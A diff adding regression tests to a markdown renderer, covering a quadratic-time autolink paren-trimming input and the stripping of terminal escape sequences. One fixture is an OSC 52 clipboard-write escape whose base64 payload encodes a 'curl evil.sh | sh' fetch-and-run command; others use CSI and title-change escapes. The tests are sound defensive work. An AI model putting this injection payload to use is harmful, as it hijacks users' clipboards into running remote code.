@@ -788,3 +788,89 @@ describe("pathological inline HTML inputs", () => {
     );
   });
 });
+
+// ============================================================================
+// Pathological inputs: permissive-autolink trailing-paren trimming. The GFM
+// ")"-balancing pass used to recount every "(" and ")" in the URL for each
+// trailing ")" it removed, so a URL whose query string is N closing parens
+// cost O(N^2) (~4e12 byte compares for N = 2M, minutes of CPU). The child
+// process is killed after 30s so a regression fails fast instead of hanging
+// the runner.
+// ============================================================================
+
+describe("pathological autolink inputs", () => {
+  test("autolink with a long run of trailing close-parens renders in linear time", async () => {
+    await using proc = Bun.spawn({
+      cmd: [
+        bunExe(),
+        "-e",
+        `
+        const parens = Buffer.alloc(2000000, ")").toString();
+        const input = "http://a.bc/?x=" + parens + "\\n";
+        const html = Bun.markdown.html(input, { autolinks: true });
+        if (!html.includes('<a href="http://a.bc/?x=">')) {
+          throw new Error("unexpected link target: " + JSON.stringify(html.slice(0, 120)));
+        }
+        if (!html.includes(")))))))")) throw new Error("trimmed parens missing from output");
+        if (html.length <= parens.length) throw new Error("unexpected output length " + html.length);
+        console.log("DONE");
+        `,
+      ],
+      env: bunEnv,
+      stdout: "pipe",
+      stderr: "pipe",
+      timeout: 30_000,
+      killSignal: "SIGKILL",
+    });
+    const [stdout, stderr, exitCode] = await Promise.all([proc.stdout.text(), proc.stderr.text(), proc.exited]);
+    expect(stderr).toBe("");
+    expect(stdout).toContain("DONE");
+    expect(exitCode).toBe(0);
+
+    // The trimming semantics themselves are unchanged: balanced parens stay
+    // part of the URL, a trailing unbalanced ")" is trimmed off it.
+    expect(Markdown.html("http://a.bc/?x=(1)\n", { autolinks: true })).toContain('<a href="http://a.bc/?x=(1)">');
+    const trimmed = Markdown.html("http://a.bc/?x=(1))\n", { autolinks: true });
+    expect(trimmed).toContain('<a href="http://a.bc/?x=(1)">');
+    expect(trimmed).not.toContain('x=(1))"');
+  }, 90_000);
+});
+
+// ============================================================================
+// ANSI renderer: text taken from the markdown document must not be able to
+// smuggle its own terminal control sequences (OSC 52 clipboard writes, title
+// changes, CSI device queries, ...) into the output alongside the renderer's
+// styling escapes.
+// ============================================================================
+
+describe("ansi renderer source-text control bytes", () => {
+  test("escape sequences embedded in markdown source are stripped from terminal output", () => {
+    // OSC 52 clipboard-write sequence in a paragraph. With colors disabled
+    // the renderer emits no escapes of its own, so the output must contain
+    // no ESC or BEL byte at all.
+    const osc52 = "before \x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\x07 after\n";
+    const plain = Markdown.ansi(osc52, { colors: false });
+    expect(plain).toContain("before");
+    expect(plain).toContain("after");
+    expect(plain).not.toContain("\x1b");
+    expect(plain).not.toContain("\x07");
+    // With colors enabled the renderer emits its own SGR escapes, but never
+    // an OSC sequence taken from the document (hyperlinks are off by default).
+    expect(Markdown.ansi(osc52)).not.toContain("\x1b]");
+
+    // CSI sequences, OSC title changes, and bare C0 controls are dropped too.
+    const csi = Markdown.ansi("x \x1b[31mred\x1b[0m \x1b]0;owned\x07 \x07\x08 y\n", { colors: false });
+    expect(csi).toContain("red");
+    expect(csi).toContain("y");
+    expect(csi).not.toContain("\x1b");
+    expect(csi).not.toContain("\x07");
+    expect(csi).not.toContain("\x08");
+
+    // A numeric character reference that decodes to a raw control byte is
+    // sanitized after decoding.
+    expect(Markdown.ansi("a &#27;[31m b\n", { colors: false })).not.toContain("\x1b");
+
+    // Ordinary text is unaffected.
+    expect(Markdown.ansi("hello world\n", { colors: false })).toContain("hello world");
+  });
+});
